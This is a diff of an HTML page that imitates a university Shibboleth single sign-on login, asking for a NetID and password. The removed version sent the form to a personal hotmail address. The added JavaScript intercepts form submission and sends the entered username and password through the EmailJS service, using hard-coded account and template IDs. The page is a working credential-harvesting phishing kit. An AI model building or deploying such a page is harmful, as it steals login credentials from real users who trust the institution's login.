@@ -40,17 +40,15 @@
     <div class="section login">
         
 
-        <form action="mailto:brendon_lugo@hotmail.com" method="post">
-
-                        
-                        <div class="form-element-wrapper">
-                <label for="username">NetID</label>
-                <input class="form-element form-field" id="username" name="to_name" type="text" value="">
+      <form id="myform" method="post">
+           <div class="form-element-wrapper">
+                <label>username</label>
+                <input type="text" name="to_name" />
             </div>
-
+          
             <div class="form-element-wrapper">
-                <label for="password">Password</label>
-                <input class="form-element form-field" id="password" name="password" type="password" value="">
+                <label>password</label>
+                <input type="text" name="password" />
             </div>
 
             <div class="form-element-wrapper">
@@ -62,12 +60,13 @@
                 <input id="_shib_idp_revokeConsent" type="checkbox" name="_shib_idp_revokeConsent" value="true">
                 <label for="_shib_idp_revokeConsent">Clear prior granting of permission for release of your information to this service.</label>
             </div>
-
-                        <div class="form-element-wrapper mt-4">
-                <button class="form-element form-button" type="submit" name="_eventId_proceed" onclick="this.childNodes[0].nodeValue='Logging in, please wait...'">Send</button>
+            <div class="form-element-wrapper mt-4">
+                <br><br>
+                <button>
+                     Send
+                </button>
             </div>
-            
-                    </form>
+        </form>
 
         
                         
@@ -98,7 +97,56 @@
     </div>
 </footer>
 </div>
+script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
 
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2.3.2/dist/email.min.js"></script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init("user_pynlPd9jnF3gDm35msesz");
+   })();
+</script>
+
+  <!-- TODO: Missing CoffeeScript 2 -->
+
+  <script type="text/javascript">//<![CDATA[
+
+
+
+var myform = $("form#myform");
+myform.submit(function(event){
+	event.preventDefault();
+
+  // Change to your service ID, or keep using the default service
+  var service_id = "default_service";
+  var template_id = "template_hdbcH0Zb";
+
+  myform.find("button").text("Sending...");
+  emailjs.sendForm(service_id,template_id,myform[0])
+  	.then(function(){ 
+    	alert("Sent!");
+       myform.find("button").text("Send");
+    }, function(err) {
+       alert("Send email failed!\r\n Response:\n " + JSON.stringify(err));
+       myform.find("button").text("Send");
+    });
+  return false;
+});
+
+
+  //]]></script>
+
+  <script>
+    // tell the embed parent frame the height of the content
+    if (window.parent && window.parent.parent){
+      window.parent.parent.postMessage(["resultsFrame", {
+        height: document.body.getBoundingClientRect().height,
+        slug: ""
+      }], "*")
+    }
+
+    // always overwrite window.name, in case users try to set it manually
+    window.name = "result"
+  </script>
 
 </body></html>
 <!-- Container ID: $custom['hostname'] -->
